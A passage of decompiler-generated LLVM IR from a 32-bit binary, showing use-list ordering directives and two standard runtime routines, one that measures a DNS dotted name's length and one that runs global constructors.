  uselistorder i8 1, { 0, 45, 47, 52, 1, 51, 46, 38, 49, 50, 39, 48, 40, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 41, 42, 36, 43, 44, 8, 37 }
  uselistorder i8 46, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 23, 24, 25, 26, 38, 39, 34, 35, 40, 41, 28, 29, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 5, 6, 48, 0, 7, 18, 42, 36, 37, 47, 30, 27, 31, 32, 33, 43, 44, 45, 19, 20, 21, 46, 8, 1, 2, 22 }
  uselistorder i32* @edi, { 6, 258, 259, 33, 260, 261, 262, 31, 263, 116, 36, 34, 117, 67, 68, 69, 70, 71, 72, 73, 264, 7, 265, 0, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 74, 9, 8, 75, 76, 77, 78, 79, 87, 80, 81, 82, 83, 84, 85, 86, 281, 10, 282, 11, 283, 284, 285, 286, 291, 292, 1, 287, 288, 289, 290, 88, 89, 90, 453, 35, 454, 32, 458, 419, 420, 441, 442, 379, 413, 414, 421, 12, 422, 423, 424, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 293, 294, 295, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 315, 415, 416, 13, 14, 417, 418, 91, 92, 93, 94, 95, 131, 132, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 114, 113, 115, 118, 119, 120, 121, 471, 472, 476, 477, 122, 123, 124, 125, 126, 127, 128, 129, 130, 473, 15, 474, 475, 443, 444, 445, 446, 447, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 448, 449, 450, 451, 452, 133, 134, 135, 136, 216, 217, 218, 219, 425, 426, 380, 381, 382, 383, 384, 427, 428, 429, 430, 16, 431, 432, 433, 434, 435, 436, 437, 500, 501, 17, 502, 503, 18, 504, 505, 226, 506, 570, 245, 19, 246, 247, 248, 137, 138, 139, 140, 141, 142, 143, 144, 145, 249, 20, 250, 251, 511, 521, 522, 523, 524, 525, 512, 513, 514, 515, 516, 517, 518, 519, 520, 478, 492, 493, 479, 480, 481, 482, 483, 484, 485, 486, 21, 487, 488, 489, 490, 491, 316, 317, 22, 318, 319, 320, 321, 322, 323, 324, 296, 297, 298, 299, 385, 386, 387, 23, 388, 389, 568, 569, 438, 439, 440, 336, 24, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 325, 326, 327, 328, 348, 349, 350, 227, 228, 229, 390, 391, 392, 393, 394, 395, 396, 397, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 25, 412, 62, 63, 64, 398, 26, 399, 400, 564, 565, 566, 567, 351, 352, 353, 354, 355, 356, 357, 232, 236, 237, 238, 239, 372, 373, 374, 375, 358, 359, 360, 361, 362, 363, 526, 527, 528, 233, 234, 235, 252, 253, 210, 211, 212, 185, 186, 187, 180, 181, 182, 213, 214, 215, 333, 334, 335, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 313, 314, 230, 231, 554, 555, 556, 156, 157, 158, 164, 165, 166, 561, 562, 563, 159, 160, 161, 455, 456, 457, 529, 557, 558, 559, 560, 200, 198, 199, 27, 162, 163, 530, 531, 28, 532, 533, 167, 168, 507, 508, 169, 170, 534, 535, 536, 494, 495, 496, 497, 498, 499, 171, 172, 2, 3, 173, 174, 175, 176, 177, 178, 179, 537, 538, 539, 183, 184, 188, 189, 190, 191, 192, 193, 194, 547, 548, 549, 4, 29, 550, 551, 30, 552, 553, 540, 541, 542, 543, 544, 545, 546, 195, 196, 197, 509, 510, 65, 66, 201, 202, 203, 204, 205, 206, 207, 368, 369, 370, 371, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 208, 209, 220, 221, 223, 222, 5, 224, 225, 240, 241, 242, 243, 244, 254, 255, 256, 257, 329, 330, 331, 332, 364, 365, 366, 367, 376, 377, 378 }
  uselistorder i32 256, { 1, 62, 2, 3, 4, 5, 6, 7, 55, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 54, 19, 20, 21, 64, 63, 22, 23, 26, 24, 25, 27, 28, 29, 49, 50, 30, 51, 56, 65, 57, 31, 32, 66, 33, 34, 0, 59, 60, 52, 35, 53, 36, 37, 67, 38, 39, 40, 41, 42, 43, 44, 45, 61, 46, 47, 58, 48 }
  uselistorder i8 64, { 0, 8, 3, 4, 7, 9, 5, 6, 1, 10, 2 }
  uselistorder i1 true, { 0, 5, 7, 1, 2, 6, 3, 4 }
  uselistorder i32* @edx, { 7, 198, 199, 200, 201, 202, 203, 55, 82, 309, 310, 311, 204, 205, 4, 209, 207, 208, 3, 210, 211, 212, 213, 214, 215, 216, 217, 56, 60, 57, 58, 59, 218, 219, 220, 221, 222, 223, 224, 230, 225, 226, 227, 228, 229, 79, 80, 81, 85, 0, 86, 5, 25, 61, 62, 63, 27, 26, 64, 65, 66, 67, 70, 71, 72, 73, 74, 75, 76, 68, 69, 326, 308, 312, 313, 314, 315, 316, 317, 318, 77, 78, 329, 8, 330, 99, 234, 231, 232, 233, 235, 237, 238, 239, 240, 9, 87, 83, 332, 84, 88, 89, 90, 91, 92, 93, 331, 94, 95, 96, 41, 42, 43, 170, 319, 320, 261, 262, 10, 263, 264, 265, 273, 274, 275, 321, 322, 323, 324, 345, 346, 347, 348, 11, 349, 350, 97, 98, 175, 328, 333, 1, 334, 351, 352, 402, 401, 183, 185, 12, 186, 187, 188, 189, 190, 191, 192, 100, 101, 102, 103, 104, 105, 362, 365, 13, 366, 363, 14, 364, 361, 335, 15, 336, 387, 241, 242, 244, 245, 246, 193, 6, 16, 206, 243, 247, 325, 248, 249, 17, 250, 266, 267, 268, 251, 252, 269, 276, 277, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 24, 295, 296, 278, 297, 18, 298, 299, 301, 19, 302, 303, 304, 305, 306, 307, 44, 20, 300, 353, 21, 272, 405, 406, 367, 177, 388, 389, 368, 169, 106, 108, 107, 109, 114, 110, 111, 112, 113, 236, 176, 360, 28, 390, 2, 327, 369, 115, 391, 392, 400, 116, 117, 118, 393, 394, 354, 355, 119, 370, 371, 372, 375, 376, 377, 45, 46, 373, 374, 120, 338, 339, 340, 341, 344, 121, 122, 124, 125, 126, 127, 128, 129, 130, 47, 48, 337, 342, 343, 123, 131, 378, 379, 380, 132, 133, 49, 50, 135, 29, 142, 143, 144, 51, 134, 386, 395, 396, 397, 398, 399, 381, 385, 382, 383, 22, 384, 359, 356, 357, 358, 136, 137, 138, 139, 140, 141, 145, 146, 148, 149, 150, 152, 155, 156, 52, 53, 157, 153, 154, 147, 151, 158, 159, 160, 161, 162, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 23, 40, 168, 163, 166, 164, 165, 54, 167, 403, 404, 171, 172, 173, 174, 178, 179, 180, 181, 182, 184, 194, 195, 196, 197, 253, 254, 255, 256, 257, 258, 259, 260, 270, 271, 407, 408, 409 }
  uselistorder i32* @esi, { 434, 435, 436, 437, 438, 439, 75, 440, 224, 225, 76, 226, 82, 83, 84, 14, 227, 228, 176, 177, 178, 179, 180, 181, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 77, 182, 183, 15, 11, 189, 184, 185, 186, 187, 188, 460, 16, 461, 462, 466, 463, 464, 465, 473, 467, 468, 469, 470, 471, 472, 17, 190, 191, 192, 193, 194, 229, 230, 669, 670, 18, 671, 672, 195, 196, 197, 198, 203, 204, 205, 623, 624, 633, 634, 635, 19, 636, 637, 474, 475, 638, 20, 662, 663, 21, 22, 622, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 23, 649, 650, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 476, 24, 477, 478, 479, 25, 480, 481, 486, 487, 488, 489, 490, 491, 492, 493, 494, 2, 495, 496, 497, 498, 499, 500, 501, 502, 117, 118, 119, 120, 121, 122, 626, 627, 628, 199, 26, 200, 27, 201, 202, 625, 206, 207, 237, 208, 209, 210, 211, 212, 213, 214, 216, 215, 28, 12, 217, 218, 220, 78, 29, 219, 221, 222, 223, 231, 232, 233, 234, 691, 692, 693, 698, 0, 235, 236, 238, 239, 240, 241, 242, 243, 244, 694, 695, 696, 697, 245, 246, 247, 248, 249, 250, 629, 630, 631, 632, 251, 252, 253, 254, 255, 256, 664, 665, 257, 123, 31, 125, 126, 127, 124, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 30, 143, 144, 145, 146, 147, 148, 149, 141, 142, 150, 151, 152, 153, 154, 155, 666, 667, 668, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 32, 33, 270, 271, 34, 272, 273, 403, 404, 405, 406, 407, 737, 738, 739, 740, 503, 504, 572, 573, 651, 652, 653, 1, 654, 741, 742, 743, 35, 744, 745, 746, 747, 748, 847, 848, 849, 420, 421, 422, 423, 424, 425, 426, 749, 761, 762, 274, 275, 276, 277, 427, 428, 429, 3, 430, 431, 432, 278, 279, 280, 775, 787, 36, 788, 789, 782, 783, 784, 785, 786, 779, 780, 781, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 37, 711, 79, 712, 713, 714, 715, 505, 506, 509, 510, 511, 512, 850, 38, 851, 852, 482, 483, 484, 485, 574, 575, 39, 576, 80, 70, 577, 507, 508, 513, 514, 859, 860, 655, 656, 657, 658, 659, 660, 661, 515, 516, 517, 518, 519, 520, 521, 533, 40, 13, 534, 535, 536, 537, 538, 41, 71, 539, 540, 541, 542, 522, 523, 524, 525, 526, 527, 543, 42, 544, 545, 408, 43, 409, 410, 578, 579, 580, 581, 45, 582, 4, 584, 585, 586, 587, 44, 588, 589, 583, 590, 591, 592, 593, 5, 594, 595, 596, 597, 598, 599, 72, 46, 600, 601, 47, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 48, 619, 620, 621, 49, 156, 602, 6, 603, 604, 750, 751, 759, 760, 853, 854, 855, 856, 857, 858, 546, 547, 548, 549, 550, 50, 551, 552, 553, 554, 411, 412, 416, 417, 568, 569, 570, 571, 555, 556, 557, 558, 559, 51, 52, 560, 561, 413, 414, 415, 824, 825, 531, 532, 281, 53, 282, 283, 284, 285, 286, 287, 292, 288, 289, 290, 291, 297, 298, 763, 764, 369, 352, 353, 765, 766, 767, 293, 294, 54, 295, 296, 790, 791, 792, 793, 7, 8, 794, 795, 796, 716, 722, 723, 733, 9, 734, 735, 736, 826, 827, 831, 832, 833, 834, 845, 846, 299, 300, 301, 302, 303, 304, 752, 753, 754, 755, 756, 757, 758, 305, 306, 307, 797, 798, 799, 803, 804, 805, 806, 807, 811, 157, 158, 159, 800, 801, 802, 55, 308, 309, 724, 725, 726, 727, 731, 732, 310, 311, 312, 313, 314, 315, 316, 160, 161, 162, 720, 717, 718, 719, 73, 721, 728, 729, 730, 317, 318, 319, 320, 321, 776, 777, 56, 778, 808, 809, 810, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 354, 355, 356, 357, 358, 835, 836, 837, 838, 839, 163, 164, 165, 166, 167, 334, 335, 336, 337, 338, 339, 57, 340, 58, 341, 342, 343, 840, 841, 842, 843, 844, 828, 60, 59, 829, 830, 812, 813, 814, 61, 822, 823, 815, 816, 817, 818, 819, 820, 821, 344, 771, 772, 773, 774, 345, 346, 347, 348, 349, 74, 350, 351, 768, 769, 770, 168, 169, 170, 171, 172, 359, 62, 360, 361, 362, 363, 364, 365, 366, 367, 368, 370, 371, 372, 373, 374, 375, 376, 63, 377, 381, 382, 383, 384, 173, 174, 175, 385, 386, 387, 378, 379, 380, 565, 566, 567, 66, 85, 86, 87, 88, 65, 89, 90, 91, 64, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 401, 402, 388, 81, 393, 67, 394, 395, 396, 397, 398, 399, 400, 389, 68, 69, 10, 390, 391, 392, 418, 419, 433, 528, 529, 530, 562, 563, 564, 861 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805a273, { 1, 0 }
  uselistorder label %dec_label_pc_805a238, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805a28a = icmp eq i32 %arg1, 0
  br i1 %v1_805a28a, label %dec_label_pc_805a2b9, label %dec_label_pc_805a2aa.preheader

dec_label_pc_805a2aa.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805a2aa10 = add i32 %arg2, %arg1
  %v3_805a2aa11 = inttoptr i32 %v2_805a2aa10 to i8*
  %v4_805a2aa12 = load i8, i8* %v3_805a2aa11, align 1
  %v1_805a2ae14 = add i32 %arg2, 1
  %v1_805a2b115 = icmp eq i8 %v4_805a2aa12, 0
  %v1_805a2b316 = icmp eq i1 %v1_805a2b115, false
  br i1 %v1_805a2b316, label %dec_label_pc_805a299, label %dec_label_pc_805a2b5

dec_label_pc_805a290:                             ; preds = %dec_label_pc_805a299
  %v1_805a290 = add i32 %v0_805a29017, 2
  br label %dec_label_pc_805a2b5

dec_label_pc_805a299:                             ; preds = %dec_label_pc_805a2aa.preheader, %dec_label_pc_805a2aa
  %v1_805a2ae19 = phi i32 [ %v1_805a2ae, %dec_label_pc_805a2aa ], [ %v1_805a2ae14, %dec_label_pc_805a2aa.preheader ]
  %v5_805a2aa18.in = phi i8 [ %v4_805a2aa, %dec_label_pc_805a2aa ], [ %v4_805a2aa12, %dec_label_pc_805a2aa.preheader ]
  %v0_805a29017 = phi i32 [ %v2_805a2a7, %dec_label_pc_805a2aa ], [ %arg2, %dec_label_pc_805a2aa.preheader ]
  %v5_805a2aa18 = zext i8 %v5_805a2aa18.in to i32
  %v1_805a29b = and i32 %v5_805a2aa18, 192
  %v6_805a2a0 = icmp eq i32 %v1_805a29b, 192
  %v2_805a2a7 = add i32 %v5_805a2aa18, %v1_805a2ae19
  br i1 %v6_805a2a0, label %dec_label_pc_805a290, label %dec_label_pc_805a2aa

dec_label_pc_805a2aa:                             ; preds = %dec_label_pc_805a299
  store i32 %v2_805a2a7, i32* @ecx, align 4
  %v2_805a2aa = add i32 %v2_805a2a7, %arg1
  %v3_805a2aa = inttoptr i32 %v2_805a2aa to i8*
  %v4_805a2aa = load i8, i8* %v3_805a2aa, align 1
  %v1_805a2ae = add i32 %v2_805a2a7, 1
  %v1_805a2b1 = icmp eq i8 %v4_805a2aa, 0
  %v1_805a2b3 = icmp eq i1 %v1_805a2b1, false
  br i1 %v1_805a2b3, label %dec_label_pc_805a299, label %dec_label_pc_805a2b5

dec_label_pc_805a2b5:                             ; preds = %dec_label_pc_805a2aa.preheader, %dec_label_pc_805a2aa, %dec_label_pc_805a290
  %v0_805a2b5 = phi i32 [ %v1_805a290, %dec_label_pc_805a290 ], [ %v1_805a2ae14, %dec_label_pc_805a2aa.preheader ], [ %v1_805a2ae, %dec_label_pc_805a2aa ]
  %v2_805a2b7 = sub i32 %v0_805a2b5, %arg2
  br label %dec_label_pc_805a2b9

dec_label_pc_805a2b9:                             ; preds = %entry, %dec_label_pc_805a2b5
  %v0_805a2bc = phi i32 [ -1, %entry ], [ %v2_805a2b7, %dec_label_pc_805a2b5 ]
  ret i32 %v0_805a2bc

; uselistorder directives
  uselistorder i8 %v4_805a2aa, { 1, 0 }
  uselistorder i32 %v2_805a2a7, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 196, 34, 172, 197, 234, 235, 33, 99, 201, 202, 36, 39, 38, 198, 203, 204, 205, 176, 206, 207, 208, 209, 210, 211, 183, 40, 184, 185, 69, 212, 213, 41, 100, 42, 43, 44, 74, 75, 245, 101, 102, 236, 76, 103, 7, 188, 70, 186, 187, 237, 71, 45, 238, 46, 239, 240, 246, 8, 9, 10, 82, 93, 214, 215, 216, 217, 177, 218, 219, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 163, 0, 1, 59, 241, 173, 242, 77, 243, 180, 181, 94, 104, 105, 164, 244, 83, 182, 106, 11, 12, 84, 78, 226, 227, 95, 13, 85, 86, 107, 108, 109, 110, 111, 112, 113, 249, 79, 174, 5, 114, 165, 115, 166, 116, 167, 250, 72, 14, 193, 37, 117, 118, 2, 119, 3, 120, 4, 121, 122, 15, 16, 17, 18, 87, 247, 19, 20, 96, 21, 123, 220, 221, 222, 223, 60, 88, 194, 73, 199, 200, 22, 251, 89, 61, 62, 228, 229, 80, 23, 24, 230, 25, 231, 26, 90, 232, 233, 225, 252, 124, 97, 178, 248, 63, 64, 65, 66, 67, 98, 125, 168, 189, 81, 27, 126, 127, 28, 68, 179, 175, 6, 128, 169, 129, 170, 190, 130, 191, 29, 30, 192, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 150, 153, 152, 91, 155, 92, 154, 195, 31, 157, 32, 156, 35, 224, 159, 158, 171, 160, 161, 162 }
  uselistorder i8 0, { 31, 3, 6, 7, 32, 5, 4, 140, 141, 66, 61, 142, 233, 9, 149, 144, 145, 8, 147, 148, 146, 25, 150, 0, 1, 62, 63, 151, 152, 27, 153, 10, 67, 12, 110, 109, 11, 33, 154, 155, 181, 234, 235, 239, 15, 161, 157, 158, 156, 13, 159, 160, 14, 26, 162, 163, 164, 165, 166, 167, 168, 169, 170, 64, 65, 238, 52, 50, 51, 68, 69, 17, 112, 111, 16, 113, 114, 182, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 2, 211, 236, 237, 257, 212, 278, 131, 34, 44, 132, 18, 276, 262, 263, 264, 240, 241, 242, 243, 244, 245, 35, 246, 134, 19, 143, 213, 214, 45, 215, 171, 172, 173, 183, 184, 185, 186, 187, 216, 217, 218, 219, 220, 221, 222, 223, 224, 20, 225, 226, 227, 228, 229, 230, 231, 232, 53, 258, 188, 189, 190, 194, 191, 192, 70, 277, 259, 71, 72, 28, 73, 266, 267, 268, 269, 270, 272, 273, 274, 271, 247, 248, 249, 252, 250, 251, 21, 253, 254, 256, 74, 75, 76, 77, 78, 79, 80, 81, 82, 255, 29, 83, 275, 84, 85, 261, 265, 54, 55, 88, 86, 87, 260, 56, 57, 58, 59, 89, 90, 91, 92, 94, 93, 22, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 106, 46, 47, 48, 49, 108, 30, 117, 115, 116, 118, 119, 120, 121, 122, 124, 123, 23, 125, 126, 127, 128, 129, 130, 133, 135, 136, 137, 138, 139, 174, 175, 176, 177, 178, 179, 180, 193, 279, 280, 24, 60, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32* @ecx, {}
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a2b9, { 1, 0 }
  uselistorder label %dec_label_pc_805a2b5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805a299, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805a2cc = load i32, i32* @global_var_805e1cc.370, align 4
  %v10_805a2d1 = icmp eq i32 %v0_805a2cc, -1
  br i1 %v10_805a2d1, label %dec_label_pc_805a2e2, label %dec_label_pc_805a2d6.preheader

dec_label_pc_805a2d6.preheader:                   ; preds = %entry
  br label %dec_label_pc_805a2d6

dec_label_pc_805a2d6:                             ; preds = %dec_label_pc_805a2d6.preheader, %dec_label_pc_805a2d6
  %v4_805a2d9 = phi i32 [ %v0_805a2cc, %dec_label_pc_805a2d6.preheader ], [ %v2_805a2db, %dec_label_pc_805a2d6 ]
  %v0_805a2d6 = phi i32 [ ptrtoint (i32* @global_var_805e1cc.370 to i32), %dec_label_pc_805a2d6.preheader ], [ %v1_805a2d6, %dec_label_pc_805a2d6 ]
  %v1_805a2d6 = add i32 %v0_805a2d6, -4
  call void @__pseudo_call(i32 %v4_805a2d9)
  %v1_805a2db = inttoptr i32 %v1_805a2d6 to i32*
  %v2_805a2db = load i32, i32* %v1_805a2db, align 4
  %v10_805a2dd = icmp eq i32 %v2_805a2db, -1
  %v1_805a2e0 = icmp eq i1 %v10_805a2dd, false
  br i1 %v1_805a2e0, label %dec_label_pc_805a2d6, label %dec_label_pc_805a2e2.loopexit

dec_label_pc_805a2e2.loopexit:                    ; preds = %dec_label_pc_805a2d6
  %v2_805a2e2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805a2e2

dec_label_pc_805a2e2:                             ; preds = %dec_label_pc_805a2e2.loopexit, %entry
  %v2_805a2e2 = phi i32 [ %v2_805a2e2.pre, %dec_label_pc_805a2e2.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_805a2e2

; uselistorder directives
  uselistorder i32 %v0_805a2cc, { 1, 0 }
  uselistorder i1 false, { 606, 457, 6, 2, 3, 8, 458, 460, 459, 7, 462, 461, 148, 200, 199, 463, 702, 703, 52, 10, 53, 472, 467, 471, 469, 470, 66, 464, 465, 468, 9, 473, 474, 475, 476, 149, 151, 152, 153, 154, 150, 155, 156, 157, 160, 158, 159, 477, 478, 483, 54, 479, 480, 482, 481, 484, 485, 490, 0, 489, 486, 487, 488, 11, 179, 180, 181, 12, 182, 183, 184, 185, 203, 748, 746, 747, 67, 743, 744, 745, 749, 750, 704, 705, 13, 706, 707, 186, 713, 714, 204, 205, 206, 207, 14, 327, 328, 329, 68, 162, 161, 70, 163, 164, 165, 166, 167, 169, 168, 69, 491, 492, 493, 734, 700, 701, 565, 566, 567, 715, 716, 717, 568, 55, 569, 570, 718, 719, 720, 751, 752, 16, 171, 170, 15, 753, 754, 755, 756, 757, 758, 759, 760, 761, 230, 499, 56, 17, 494, 495, 496, 497, 498, 500, 501, 57, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 517, 516, 709, 710, 711, 712, 172, 187, 188, 189, 190, 191, 215, 214, 18, 708, 173, 174, 175, 176, 177, 178, 735, 736, 192, 193, 194, 195, 196, 197, 198, 201, 765, 762, 202, 208, 209, 211, 210, 71, 212, 764, 763, 72, 213, 216, 217, 737, 218, 219, 220, 221, 738, 120, 121, 122, 123, 125, 124, 73, 126, 127, 128, 129, 130, 131, 19, 58, 20, 132, 133, 135, 134, 136, 739, 740, 741, 742, 222, 225, 223, 224, 226, 227, 228, 229, 21, 330, 331, 332, 333, 721, 722, 723, 518, 519, 571, 572, 573, 607, 608, 609, 610, 611, 612, 613, 90, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 724, 725, 726, 727, 728, 729, 730, 731, 796, 797, 63, 633, 74, 634, 635, 636, 798, 799, 800, 369, 783, 795, 873, 874, 875, 876, 877, 881, 75, 882, 883, 880, 872, 801, 107, 412, 413, 414, 416, 417, 418, 370, 371, 434, 435, 436, 437, 438, 439, 22, 231, 232, 64, 423, 23, 424, 425, 595, 233, 807, 808, 812, 813, 857, 858, 859, 824, 825, 826, 827, 828, 829, 818, 819, 820, 821, 822, 823, 817, 766, 767, 768, 769, 770, 771, 772, 773, 774, 50, 776, 775, 780, 777, 778, 779, 24, 781, 782, 415, 277, 860, 298, 520, 521, 523, 524, 445, 4, 5, 448, 447, 446, 25, 878, 466, 637, 638, 639, 76, 640, 26, 522, 525, 732, 733, 526, 527, 528, 529, 530, 531, 576, 574, 575, 27, 59, 577, 579, 578, 77, 580, 582, 581, 78, 583, 532, 533, 584, 372, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 660, 659, 661, 662, 663, 664, 665, 667, 51, 668, 666, 669, 671, 670, 28, 672, 673, 675, 674, 79, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 137, 138, 802, 80, 806, 29, 585, 586, 587, 588, 589, 373, 81, 374, 375, 376, 377, 378, 379, 604, 590, 591, 234, 235, 236, 237, 238, 239, 240, 241, 242, 248, 65, 809, 243, 244, 245, 246, 247, 831, 830, 832, 249, 250, 785, 793, 794, 862, 251, 252, 253, 803, 804, 805, 852, 856, 863, 598, 91, 92, 599, 30, 254, 833, 834, 837, 838, 839, 840, 841, 139, 843, 835, 836, 786, 787, 788, 31, 791, 255, 32, 256, 257, 258, 261, 262, 792, 784, 82, 789, 790, 260, 259, 1, 263, 844, 278, 816, 842, 83, 845, 264, 265, 266, 140, 141, 142, 143, 267, 268, 269, 281, 282, 283, 284, 285, 288, 286, 84, 287, 270, 271, 814, 864, 299, 300, 301, 272, 93, 273, 274, 275, 95, 96, 853, 854, 85, 855, 94, 865, 33, 866, 97, 868, 869, 870, 98, 871, 99, 861, 867, 846, 35, 851, 34, 100, 848, 847, 36, 849, 37, 101, 850, 276, 815, 279, 810, 60, 811, 144, 145, 280, 289, 290, 291, 292, 293, 294, 295, 296, 297, 38, 302, 303, 304, 305, 308, 311, 312, 313, 309, 310, 307, 306, 600, 601, 86, 314, 87, 315, 108, 40, 109, 39, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 316, 322, 323, 61, 321, 320, 317, 318, 88, 319, 41, 146, 324, 49, 325, 326, 879, 342, 334, 42, 335, 336, 337, 338, 339, 340, 341, 102, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 380, 381, 382, 386, 387, 383, 384, 385, 44, 45, 389, 388, 390, 391, 43, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 419, 62, 420, 421, 422, 426, 427, 428, 429, 430, 431, 432, 433, 440, 441, 442, 443, 444, 449, 450, 451, 452, 453, 454, 455, 456, 534, 535, 536, 104, 47, 537, 538, 539, 540, 541, 542, 105, 46, 543, 544, 545, 106, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 48, 557, 558, 559, 560, 561, 103, 562, 563, 564, 592, 593, 594, 596, 597, 602, 603, 605, 884, 147, 89, 885, 886 }
  uselistorder void (i32)* @__pseudo_call, { 54, 32, 29, 13, 33, 34, 56, 57, 58, 59, 0, 14, 60, 61, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 62, 63, 27, 28, 30, 31, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 64, 65, 66, 1, 2, 3, 4, 5, 6, 7, 8, 67, 46, 47, 68, 55, 71, 72, 73, 74, 75, 50, 77, 48, 70, 49, 76, 69, 78, 9, 10, 53, 11, 51, 52, 12 }
  uselistorder i32 -4, { 22, 89, 23, 24, 25, 90, 26, 27, 28, 91, 92, 29, 105, 7, 106, 107, 108, 19, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 93, 94, 8, 0, 43, 44, 45, 46, 9, 47, 10, 48, 49, 50, 51, 52, 53, 54, 55, 11, 12, 13, 56, 57, 103, 104, 58, 59, 18, 60, 95, 96, 97, 98, 118, 120, 121, 122, 14, 119, 2, 117, 1, 5, 6, 109, 110, 111, 112, 113, 114, 115, 20, 100, 101, 102, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 116, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 88, 83, 84, 15, 85, 99, 3, 16, 86, 17, 87, 21, 4 }
  uselistorder i32 -1, { 0, 1, 108, 85, 229, 277, 278, 458, 459, 109, 110, 279, 111, 2, 3, 112, 280, 281, 4, 5, 6, 115, 114, 113, 282, 200, 201, 96, 95, 94, 283, 284, 116, 285, 230, 264, 231, 265, 89, 90, 91, 286, 287, 79, 288, 289, 290, 291, 460, 292, 461, 462, 293, 463, 117, 294, 232, 118, 295, 484, 296, 297, 298, 119, 299, 300, 301, 120, 7, 302, 233, 303, 8, 304, 464, 10, 465, 11, 466, 467, 305, 217, 211, 213, 214, 215, 216, 212, 80, 210, 202, 306, 209, 218, 219, 208, 220, 221, 222, 223, 224, 203, 204, 207, 9, 121, 12, 13, 444, 81, 445, 446, 307, 122, 308, 309, 266, 310, 311, 14, 15, 485, 486, 312, 16, 447, 17, 448, 314, 313, 106, 82, 315, 316, 468, 469, 18, 93, 123, 317, 103, 318, 479, 319, 124, 125, 320, 126, 321, 234, 322, 127, 323, 324, 225, 129, 128, 325, 326, 327, 131, 130, 132, 328, 329, 19, 86, 330, 133, 331, 134, 135, 136, 332, 137, 333, 138, 334, 139, 335, 140, 336, 141, 337, 142, 338, 20, 21, 339, 107, 143, 144, 340, 341, 342, 343, 344, 145, 345, 346, 147, 146, 235, 267, 22, 148, 347, 149, 348, 97, 349, 236, 350, 490, 351, 352, 23, 491, 487, 26, 25, 27, 28, 29, 150, 30, 151, 31, 353, 24, 488, 83, 354, 355, 356, 32, 33, 34, 470, 473, 152, 357, 153, 480, 358, 359, 471, 472, 360, 474, 475, 492, 154, 155, 361, 362, 363, 98, 364, 365, 366, 87, 367, 88, 481, 482, 92, 368, 369, 483, 38, 35, 36, 37, 370, 268, 269, 